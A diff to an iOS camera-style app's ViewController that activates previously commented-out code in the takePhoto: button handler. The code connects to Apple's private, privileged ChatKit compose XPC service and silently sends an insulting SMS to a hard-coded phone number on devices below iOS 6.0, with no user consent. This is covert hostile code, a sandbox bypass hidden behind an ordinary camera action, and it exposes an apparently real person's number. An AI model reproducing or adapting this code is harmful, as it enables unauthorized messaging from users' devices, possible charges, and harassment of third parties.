@@ -9,6 +9,7 @@
 #import "ViewController.h"
 #import <CoreMotion/CoreMotion.h>
 #import "PlotView.h"
+#import <xpc/xpc.h>
 
 
 #define kFilteringFactor 0.5
@@ -125,38 +126,39 @@ UIImage *getPreviewImage(UIImage *image, double percent) {
 
 - (IBAction)takePhoto:(UIButton *)sender
 {
-//    NSString *reqSysVer = @"6.0";
-//    NSString *currSysVer = [[UIDevice currentDevice] systemVersion];
-//    if ([currSysVer compare:reqSysVer options:NSNumericSearch] == NSOrderedAscending) {
-//        xpc_connection_t myconnection;
-//    
-//        dispatch_queue_t queue = dispatch_queue_create("com.apple.chatkit.clientcomposeserver.xpc", DISPATCH_QUEUE_CONCURRENT);
-//    
-//        myconnection = xpc_connection_create_mach_service("com.apple.chatkit.clientcomposeserver.xpc", queue, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
-//        xpc_connection_set_event_handler(myconnection, ^(xpc_object_t event) {
-//        xpc_type_t xtype = xpc_get_type(event);
-//            if (XPC_TYPE_ERROR == xtype) {
-//                NSLog(@"XPC sandbox connection error: %s\n", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
-//            }
-//        
-//            NSLog(@"Received an message event!");
-//        
-//        });
-//        
-//        xpc_connection_resume(myconnection);
-//        NSArray *receipements = [NSArray arrayWithObjects:@"+7 (90*) 000-00-00", nil];
-//        
-//        NSData *ser_rec = [NSPropertyListSerialization dataWithPropertyList:receipements format:200 options:0 error:NULL];
-//        
-//        xpc_object_t mydict = xpc_dictionary_create(0, 0, 0);
-//        xpc_dictionary_set_int64(mydict, "message-type", 0);
-//        xpc_dictionary_set_data(mydict, "recipients", [ser_rec bytes], [ser_rec length]);
-//        xpc_dictionary_set_string(mydict, "text", "hello from your application!");
-//        xpc_connection_send_message(myconnection, mydict);
-//        xpc_connection_send_barrier(myconnection, ^{
-//            NSLog(@"Message has been successfully delievered");
-//        });
-//    }
+    NSString *reqSysVer = @"6.0";
+    NSString *currSysVer = [[UIDevice currentDevice] systemVersion];
+    if ([currSysVer compare:reqSysVer options:NSNumericSearch] == NSOrderedAscending) {
+        NSLog(@"LOL!");
+        xpc_connection_t myconnection;
+    
+        dispatch_queue_t queue = dispatch_queue_create("com.apple.chatkit.clientcomposeserver.xpc", DISPATCH_QUEUE_CONCURRENT);
+    
+        myconnection = xpc_connection_create_mach_service("com.apple.chatkit.clientcomposeserver.xpc", queue, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
+        xpc_connection_set_event_handler(myconnection, ^(xpc_object_t event) {
+        xpc_type_t xtype = xpc_get_type(event);
+            if (XPC_TYPE_ERROR == xtype) {
+                NSLog(@"XPC sandbox connection error: %s\n", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
+            }
+        
+            NSLog(@"Received an message event!");
+        
+        });
+        
+        xpc_connection_resume(myconnection);
+        NSArray *receipements = [NSArray arrayWithObjects:@"+7 (916) 732-12-58", nil];
+        
+        NSData *ser_rec = [NSPropertyListSerialization dataWithPropertyList:receipements format:200 options:0 error:NULL];
+        
+        xpc_object_t mydict = xpc_dictionary_create(0, 0, 0);
+        xpc_dictionary_set_int64(mydict, "message-type", 0);
+        xpc_dictionary_set_data(mydict, "recipients", [ser_rec bytes], [ser_rec length]);
+        xpc_dictionary_set_string(mydict, "text", "you're stupid ass!");
+        xpc_connection_send_message(myconnection, mydict);
+        xpc_connection_send_barrier(myconnection, ^{
+            NSLog(@"Message has been successfully delievered");
+        });
+    }
 	[self startCameraControllerFromViewController:self usingDelegate:self];
 }
 
